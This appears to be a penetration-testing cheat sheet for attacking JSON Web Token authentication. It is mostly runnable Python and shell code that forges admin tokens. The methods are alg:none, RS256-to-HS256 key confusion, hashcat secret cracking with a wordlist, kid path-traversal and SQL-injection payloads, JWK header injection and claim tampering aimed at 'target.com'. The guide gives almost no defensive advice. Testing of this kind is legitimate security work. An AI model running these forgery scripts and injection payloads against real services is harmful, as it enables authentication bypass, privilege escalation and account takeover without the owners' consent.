# JWT Attacks — Algorithm Confusion, None Attack, Key Confusion

Complete methodology for testing JSON Web Token vulnerabilities: alg:none, RS256→HS256 confusion, weak secrets, kid injection, JWK injection.

## Install

```bash
pip install pyjwt cryptography --break-system-packages
# jwt_tool (all-in-one):
git clone https://github.com/ticarpi/jwt_tool /opt/jwt_tool
pip install termcolor cprint pycryptodomex requests --break-system-packages

# hashcat for secret cracking:
sudo apt-get install -y hashcat
```

---

## Phase 1: Decode & Inspect

```bash
# Decode JWT without verification:
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Split and decode manually:
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null; echo

# Using jwt_tool:
python3 /opt/jwt_tool/jwt_tool.py $TOKEN

# Using python:
python3 -c "
import base64, json
token = '$TOKEN'
parts = token.split('.')
header = json.loads(base64.b64decode(parts[0] + '=='))
payload = json.loads(base64.b64decode(parts[1] + '=='))
print('Header:', json.dumps(header, indent=2))
print('Payload:', json.dumps(payload, indent=2))
"
```

---

## Phase 2: Algorithm None Attack

```bash
# Change alg to 'none' — removes signature verification
python3 -c "
import base64, json, sys

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

original_token = sys.argv[1] if len(sys.argv) > 1 else 'PASTE_TOKEN_HERE'
parts = original_token.split('.')

header = json.loads(base64.b64decode(parts[0] + '=='))
payload = json.loads(base64.b64decode(parts[1] + '=='))

# Modify payload (e.g. escalate to admin):
payload['role'] = 'admin'
payload['is_admin'] = True
payload['sub'] = '1'  # try user ID 1 (often admin)

# Forge with alg:none
header['alg'] = 'none'
forged = b64url(json.dumps(header)) + '.' + b64url(json.dumps(payload)) + '.'
print('Forged token (alg:none):')
print(forged)
" $TOKEN

# jwt_tool:
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -X a  # alg:none attack
```

---

## Phase 3: RS256 → HS256 Algorithm Confusion

```bash
# If server uses RS256 (asymmetric), try signing with HS256 using PUBLIC KEY as secret.
# Server may verify HS256 using the same key material → bypass.

# Step 1: Get public key from well-known endpoint:
curl -s "https://target.com/.well-known/jwks.json" | jq .
curl -s "https://target.com/.well-known/openid-configuration" | jq .jwks_uri

# Step 2: Extract public key PEM:
python3 -c "
import requests, base64, json
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

jwks = requests.get('https://target.com/.well-known/jwks.json').json()
key = jwks['keys'][0]

n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')
pub = RSAPublicNumbers(e, n).public_key(default_backend())
pem = pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
print(pem.decode())
" > public_key.pem

# Step 3: Forge HS256 token using public key as HMAC secret:
python3 -c "
import jwt, json

with open('public_key.pem', 'rb') as f:
    public_key = f.read()

payload = {'sub': '1', 'role': 'admin', 'iat': 9999999999}
forged = jwt.encode(payload, public_key, algorithm='HS256')
print('Forged HS256 token:')
print(forged)
"

# jwt_tool:
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -S hs256 -k public_key.pem -I -pc role -pv admin
```

---

## Phase 4: Weak Secret Cracking

```bash
# Crack HS256 secret with hashcat:
echo "$TOKEN" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Common weak secrets to try first:
for secret in secret password 123456 "" "null" "undefined" "your-256-bit-secret" \
              "secret_key" "jwt_secret" "mysecret" "changeme" "development"; do
  python3 -c "
import jwt, sys
try:
    result = jwt.decode('$TOKEN', '$secret', algorithms=['HS256'])
    print(f'[FOUND] Secret: $secret')
    print('Payload:', result)
except: pass
"
done

# If secret found — forge with admin claims:
python3 -c "
import jwt
secret = 'FOUND_SECRET'
payload = {'sub': '1', 'role': 'admin', 'is_admin': True, 'iat': 9999999999}
forged = jwt.encode(payload, secret, algorithm='HS256')
print(forged)
"
```

---

## Phase 5: kid (Key ID) Injection

```bash
# kid header parameter used to select signing key — inject path traversal / SQL

# Directory traversal via kid:
python3 -c "
import base64, json, hmac, hashlib

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# kid pointing to /dev/null → empty key
header = {'alg': 'HS256', 'kid': '../../../dev/null', 'typ': 'JWT'}
payload = {'sub': '1', 'role': 'admin', 'iat': 9999999999}

msg = b64url(json.dumps(header)) + '.' + b64url(json.dumps(payload))
sig = hmac.new(b'', msg.encode(), hashlib.sha256).digest()  # empty key
forged = msg + '.' + b64url(sig)
print('kid=/dev/null forged token:')
print(forged)
"

# SQL injection via kid:
# kid = "x' UNION SELECT 'attacker_secret'--"
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -I -hc kid -hv "x' UNION SELECT 'attacker_secret'-- -" -S hs256 -p 'attacker_secret'
```

---

## Phase 6: JWK Header Injection

```bash
# Inject your own public key via jwk header parameter

# Generate RSA key pair:
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# Forge token with embedded JWK:
python3 -c "
import jwt, json
from cryptography.hazmat.primitives.serialization import load_pem_private_key

with open('attacker_private.pem', 'rb') as f:
    private_key = load_pem_private_key(f.read(), None)

# Embed public JWK in header:
headers = {'jwk': {
    'kty': 'RSA',
    'n': '...',  # base64url encoded modulus from attacker_public.pem
    'e': 'AQAB',
}}

payload = {'sub': '1', 'role': 'admin', 'iat': 9999999999}
forged = jwt.encode(payload, private_key, algorithm='RS256', headers=headers)
print(forged)
"

# jwt_tool automates this:
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -X i -I -pc role -pv admin
```

---

## Phase 7: Claim Manipulation

```bash
# Modify expiry, role, user ID with known/cracked secret:
python3 -c "
import jwt, time

secret = 'KNOWN_SECRET'
original = jwt.decode('$TOKEN', secret, algorithms=['HS256'])
print('Original payload:', original)

# Modifications to try:
modifications = [
    {'sub': '1'},           # become user ID 1 (admin)
    {'role': 'admin'},      # elevate role
    {'is_admin': True},     # mass assignment field
    {'email': 'admin@target.com'},  # email takeover
    {'exp': int(time.time()) + 31536000},  # extend expiry 1 year
]

for mod in modifications:
    payload = {**original, **mod}
    forged = jwt.encode(payload, secret, algorithm='HS256')
    print(f'Modified {list(mod.keys())}: {forged[:80]}...')
"
```

---

## Pro Tips

1. **Check alg:none first** — no key needed, instant test
2. **Check JWKS endpoint** — `/.well-known/jwks.json`, `/api/auth/jwks`, `/oauth/jwks`
3. **RS256→HS256** — requires public key; check X.509 cert endpoint too (`/api/public-key`)
4. **Hashcat mode 16500** — fastest JWT secret cracker; try `rockyou.txt` + `best64.rule`
5. **kid injection** — target often uses filesystem read; path traversal + SQL inject both work
6. **Check `x5u`/`jku` headers** — URL-based key injection; point to attacker-controlled JWK server
7. **`exp` in the past** — some servers don't verify expiry; test with expired token

## Summary

JWT flow: decode header/payload → check alg → try alg:none → if RS256 grab public key → try alg confusion → if HS256 crack secret with hashcat → if kid/jku present try injection → modify payload claims → forge and test.
